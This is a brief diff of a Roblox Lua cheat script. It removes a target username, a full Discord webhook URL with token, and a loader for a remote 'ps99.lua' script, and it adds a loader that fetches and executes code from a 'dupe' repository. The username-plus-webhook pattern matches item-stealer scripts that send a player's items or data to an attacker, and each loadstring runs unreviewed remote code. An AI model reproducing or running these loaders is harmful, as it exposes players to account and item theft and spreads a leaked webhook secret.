@@ -1,9 +1,6 @@
 getgenv().gui = false
 
-Username = "KeirazeIIee" 
-Webhook = "https://discord.com/api/webhooks/1274099208215068672/LCT9F-cR1VGuehQkY0idiFGFeOd-v2HCIqIX7d-A8RAva_dmfn__kojy1wJM8qXPKvWt" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXDUP1NG/roblox/main/Script"))()
 
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
